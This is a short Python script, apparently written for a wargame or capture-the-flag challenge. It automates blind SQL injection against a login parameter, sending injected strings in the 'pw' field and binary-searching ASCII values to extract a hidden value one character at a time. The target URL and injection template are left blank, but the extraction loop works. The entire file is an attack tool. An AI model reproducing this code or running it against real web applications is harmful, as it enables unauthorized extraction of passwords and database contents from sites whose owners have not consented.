import requests
from bs4 import BeautifulSoup

cookie = {'PHPSESSID':'yourID'}

# TARGET
url = '' 

# REQUEST SETTING
def req(str1):
    r = requests.request('GET', url, cookies=cookie, params={'id':'a','pw':str1})
    return r

def injector(injectStr): # Return Beautiful Soup Object After Injection
    r = req(injectStr)
    print('injectStr =>', injectStr)
    beauti = BeautifulSoup(r.text, 'html.parser')
    return beauti

# Search Algorithm ( Brute Forcing )
def BinarySearchInjection(idx,frame):

    # RESULT STRING
    find_text='' 
    # ASCII SCOPE
    head=0
    trail=127

    while(head<=trail):
        mid = (head+trail)//2

        injection = (frame % (idx,'=',mid))
        beauti = injector(injection)
        
        if beauti.text.find(find_text) != -1:
            return chr(mid)
        else:
            injection = (frame % (idx,'<', mid))
            beauti = injector(injection)

            if beauti.text.find(find_text) != -1:
                trail = mid-1
            else:
                head = mid+1